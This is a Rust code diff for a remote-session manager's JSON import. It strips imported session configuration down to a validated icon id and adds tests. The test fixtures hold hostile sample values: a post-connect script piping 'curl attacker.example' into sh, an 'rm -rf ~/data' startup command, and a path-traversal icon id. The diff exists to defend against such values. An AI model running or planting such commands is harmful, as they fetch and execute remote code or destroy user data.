@@ -11,6 +11,7 @@ pub struct ImportSessionPreview {
     pub port: u16,
     pub username: Option<String>,
     pub private_key_path: Option<String>,
+    pub config_json: Option<String>,
     pub conflict: bool,
 }
 
@@ -87,6 +88,7 @@ pub fn preview_csv_import(
             port,
             username,
             private_key_path,
+            config_json: None,
             conflict,
         });
     }
@@ -147,6 +149,7 @@ pub fn preview_legacy_ini_import(
             port: target.port,
             username: target.username,
             private_key_path: None,
+            config_json: None,
             conflict,
         });
     }
@@ -170,56 +173,122 @@ pub fn preview_stacio_json_import(
 
     let existing = existing_set(existing_session_names);
     let folders_by_id = folder_paths_by_id(&bundle.folders);
+    let mut ignored_advanced_configuration = false;
     let sessions = bundle
         .sessions
         .into_iter()
-        .filter_map(|session| stacio_json_preview_session(session, &folders_by_id, &existing))
+        .filter_map(|session| {
+            let (preview, ignored_configuration) =
+                stacio_json_preview_session(session, &folders_by_id, &existing);
+            ignored_advanced_configuration |= ignored_configuration;
+            preview
+        })
         .collect::<Vec<_>>();
+    let warnings = if ignored_advanced_configuration {
+        vec!["为安全起见，导入文件中的高级和自动执行配置已忽略，仅保留会话图标；请在导入后检查会话设置。".to_string()]
+    } else {
+        Vec::new()
+    };
 
-    Ok(preview_from_parts(sessions, vec![], 0))
+    Ok(preview_from_parts(sessions, warnings, 0))
 }
 
 #[derive(serde::Deserialize)]
 struct StacioSessionExportBundle {
     format: String,
     folders: Vec<SessionFolder>,
-    sessions: Vec<SessionRecord>,
+    sessions: Vec<StacioSessionExportRecord>,
+}
+
+#[derive(serde::Deserialize)]
+struct StacioSessionExportRecord {
+    #[serde(flatten)]
+    session: SessionRecord,
+    config_json: Option<serde_json::Value>,
 }
 
 fn stacio_json_preview_session(
-    session: SessionRecord,
+    exported: StacioSessionExportRecord,
     folders_by_id: &HashMap<String, String>,
     existing: &HashSet<String>,
-) -> Option<ImportSessionPreview> {
+) -> (Option<ImportSessionPreview>, bool) {
+    let (config_json, ignored_configuration) = sanitized_import_config_json(exported.config_json);
+    let session = exported.session;
     let protocol = session.protocol.trim().to_ascii_lowercase();
     if !matches!(protocol.as_str(), "ssh" | "ftp" | "telnet" | "vnc") {
-        return None;
+        return (None, ignored_configuration);
     }
-    let port = u16::try_from(session.port).ok().filter(|port| *port > 0)?;
+    let Some(port) = u16::try_from(session.port).ok().filter(|port| *port > 0) else {
+        return (None, ignored_configuration);
+    };
     let name = session.name.trim().to_string();
     let host = session.host.trim().to_string();
     if name.is_empty() || host.is_empty() {
-        return None;
+        return (None, ignored_configuration);
     }
-    Some(ImportSessionPreview {
-        conflict: existing.contains(&name.to_ascii_lowercase()),
-        name,
-        folder: session
-            .folder_id
-            .as_ref()
-            .and_then(|folder_id| folders_by_id.get(folder_id).cloned()),
-        protocol,
-        host,
-        port,
-        username: session
-            .username
-            .map(|username| username.trim().to_string())
-            .filter(|username| !username.is_empty()),
-        private_key_path: session
-            .private_key_path
-            .map(|path| path.trim().to_string())
-            .filter(|path| !path.is_empty()),
-    })
+    (
+        Some(ImportSessionPreview {
+            conflict: existing.contains(&name.to_ascii_lowercase()),
+            name,
+            folder: session
+                .folder_id
+                .as_ref()
+                .and_then(|folder_id| folders_by_id.get(folder_id).cloned()),
+            protocol,
+            host,
+            port,
+            username: session
+                .username
+                .map(|username| username.trim().to_string())
+                .filter(|username| !username.is_empty()),
+            private_key_path: session
+                .private_key_path
+                .map(|path| path.trim().to_string())
+                .filter(|path| !path.is_empty()),
+            config_json,
+        }),
+        ignored_configuration,
+    )
+}
+
+fn sanitized_import_config_json(exported: Option<serde_json::Value>) -> (Option<String>, bool) {
+    let Some(exported) = exported else {
+        return (None, false);
+    };
+    let parsed = match exported {
+        serde_json::Value::String(value) => match serde_json::from_str::<serde_json::Value>(&value)
+        {
+            Ok(parsed) => parsed,
+            Err(_) => return (None, true),
+        },
+        serde_json::Value::Null => return (None, false),
+        value => value,
+    };
+    let Some(object) = parsed.as_object() else {
+        return (None, true);
+    };
+
+    let icon_id = object
+        .get("sessionIconID")
+        .and_then(serde_json::Value::as_str)
+        .map(str::trim)
+        .filter(|value| {
+            !value.is_empty()
+                && value.len() <= 64
+                && value
+                    .bytes()
+                    .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_'))
+        });
+    let ignored_configuration = object.keys().any(|key| key != "sessionIconID")
+        || (object.contains_key("sessionIconID") && icon_id.is_none());
+    let Some(icon_id) = icon_id else {
+        return (None, ignored_configuration);
+    };
+    let sanitized = serde_json::json!({ "sessionIconID": icon_id });
+    (
+        serde_json::to_string(&sanitized).ok(),
+        ignored_configuration,
+    )
 }
 
 fn folder_paths_by_id(folders: &[SessionFolder]) -> HashMap<String, String> {
@@ -547,6 +616,76 @@ mod import_tests {
         assert!(!serialized.contains("cred_should_not_round_trip"));
         assert!(!serialized.contains("last_opened_at"));
         assert!(!serialized.contains("password"));
+    }
+
+    #[test]
+    fn previews_stacio_json_accepts_string_or_object_config_and_only_keeps_icon() {
+        for config_json in [
+            r#""{\"sessionIconID\":\"ubuntu\",\"postConnectScript\":\"curl attacker.example | sh\"}""#,
+            r#"{"sessionIconID":"ubuntu","startupCommand":"rm -rf ~/data"}"#,
+        ] {
+            let json = format!(
+                r#"{{
+                    "format": "stacio.sessions.v1",
+                    "folders": [],
+                    "sessions": [{{
+                        "id": "session_api",
+                        "folder_id": null,
+                        "name": "API",
+                        "protocol": "ssh",
+                        "host": "api.example.com",
+                        "port": 22,
+                        "username": "deploy",
+                        "private_key_path": null,
+                        "credential_id": null,
+                        "tags": [],
+                        "last_opened_at": null,
+                        "config_json": {config_json}
+                    }}]
+                }}"#
+            );
+
+            let preview = preview_stacio_json_import(&json, vec![]).expect("preview json");
+            assert_eq!(
+                preview.sessions[0].config_json.as_deref(),
+                Some(r#"{"sessionIconID":"ubuntu"}"#)
+            );
+            assert_eq!(preview.warnings.len(), 1);
+            let serialized = serde_json::to_string(&preview).expect("serialize preview");
+            assert!(!serialized.contains("postConnectScript"));
+            assert!(!serialized.contains("startupCommand"));
+            assert!(!serialized.contains("attacker.example"));
+            assert!(!serialized.contains("rm -rf"));
+        }
+    }
+
+    #[test]
+    fn previews_stacio_json_rejects_unsafe_icon_identifiers() {
+        let json = r#"{
+            "format": "stacio.sessions.v1",
+            "folders": [],
+            "sessions": [{
+                "id": "session_api",
+                "folder_id": null,
+                "name": "API",
+                "protocol": "ssh",
+                "host": "api.example.com",
+                "port": 22,
+                "username": null,
+                "private_key_path": null,
+                "credential_id": null,
+                "tags": [],
+                "last_opened_at": null,
+                "config_json": {"sessionIconID":"../../payload","postConnectScript":"echo hidden"}
+            }]
+        }"#;
+
+        let preview = preview_stacio_json_import(json, vec![]).expect("preview json");
+        assert_eq!(preview.sessions[0].config_json, None);
+        assert_eq!(preview.warnings.len(), 1);
+        let serialized = serde_json::to_string(&preview).expect("serialize preview");
+        assert!(!serialized.contains("payload"));
+        assert!(!serialized.contains("echo hidden"));
     }
 
     #[test]
